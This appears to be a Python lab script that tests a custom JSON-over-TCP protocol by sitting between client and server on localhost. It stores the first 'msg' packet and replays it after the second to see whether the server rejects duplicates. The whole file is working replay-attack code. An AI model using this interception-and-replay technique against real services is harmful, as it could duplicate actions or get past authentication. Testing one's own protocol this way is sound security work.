import socket
import threading
import json
import base64
import struct

# --- Packet-handling code from our protocol ---
def send_message(sock, data):
    try:
        json_data = json.dumps(data).encode('utf-8')
        len_prefix = struct.pack('>I', len(json_data))
        sock.sendall(len_prefix + json_data)
        return True
    except Exception as e:
        print(f"[Proxy] Error sending: {e}")
        return False

def receive_message(sock):
    try:
        len_prefix = sock.recv(4)
        if not len_prefix: return None
        msg_len = struct.unpack('>I', len_prefix)[0]
        
        msg_data = b''
        while len(msg_data) < msg_len:
            chunk = sock.recv(msg_len - len(msg_data))
            if not chunk: return None
            msg_data += chunk
        return json.loads(msg_data.decode('utf-8'))
    except Exception as e:
        print(f"[Proxy] Error receiving: {e}")
        return None
# --- End of protocol code ---

# Global variable to store the packet we want to replay
packet_to_replay = None

def handle_client_to_server(client_sock, server_sock):
    """Relays data from client to server, replaying the first 'msg' packet."""
    global packet_to_replay
    msg_count = 0
    
    try:
        while True:
            msg = receive_message(client_sock)
            if msg is None: break
            
            print(f"[Proxy] C->S: {msg.get('type')}")
            
            # --- REPLAY ATTACK LOGIC ---
            if msg.get("type") == "msg":
                msg_count += 1
                
                if msg_count == 1:
                    # 1. Store the first message
                    packet_to_replay = msg
                    print(f"[Proxy] ---> Intercepted first 'msg' packet (seq {msg.get('seqno')}). Storing it.")
                    # Forward it normally
                
                elif msg_count == 2:
                    # 2. Let the second message pass
                    print(f"[Proxy] ---> Intercepted second 'msg' packet (seq {msg.get('seqno')}). Forwarding it.")
                    if not send_message(server_sock, msg):
                        break
                    
                    # 3. REPLAY the first message immediately after
                    print(f"[Proxy] ---> REPLAYING first 'msg' packet (seq {packet_to_replay.get('seqno')})!")
                    if not send_message(server_sock, packet_to_replay):
                        break
                    
                    # Don't forward the original packet again, just skip to the next loop
                    continue 

            # --- END ATTACK LOGIC ---
            
            # Forward all other packets (hello, dh, etc.) and the first msg
            if not (msg.get("type") == "msg" and msg_count == 2):
                if not send_message(server_sock, msg):
                    break
    finally:
        client_sock.close()
        server_sock.close()

def handle_server_to_client(server_sock, client_sock):
    """Relays data from server to client (no tampering)."""
    try:
        while True:
            msg = receive_message(server_sock)
            if msg is None: break
            
            print(f"[Proxy] S->C: {msg.get('type')}")
            
            if not send_message(client_sock, msg):
                break
    finally:
        client_sock.close()
        server_sock.close()

def main():
    proxy_host = 'localhost'
    proxy_port = 12346  # We will listen on this port
    server_host = 'localhost'
    server_port = 12345 # The real server
    
    proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    proxy_socket.bind((proxy_host, proxy_port))
    proxy_socket.listen(5)
    
    print(f"[Proxy] Listening on {proxy_host}:{proxy_port}")
    print(f"[Proxy] Forwarding to {server_host}:{server_port}")
    
    try:
        while True:
            client_sock, client_addr = proxy_socket.accept()
            print(f"[Proxy] Accepted connection from {client_addr}")
            
            try:
                server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_sock.connect((server_host, server_port))
                print(f"[Proxy] Connected to real server at {server_host}:{server_port}")
                
                c2s_thread = threading.Thread(target=handle_client_to_server, args=(client_sock, server_sock))
                s2c_thread = threading.Thread(target=handle_server_to_client, args=(server_sock, client_sock))
                
                c2s_thread.start()
                s2c_thread.start()
                
            except Exception as e:
                print(f"[Proxy] Failed to connect to server: {e}")
                client_sock.close()
                
    except KeyboardInterrupt:
        print("\n[Proxy] Shutting down.")
    finally:
        proxy_socket.close()

if __name__ == "__main__":
    main()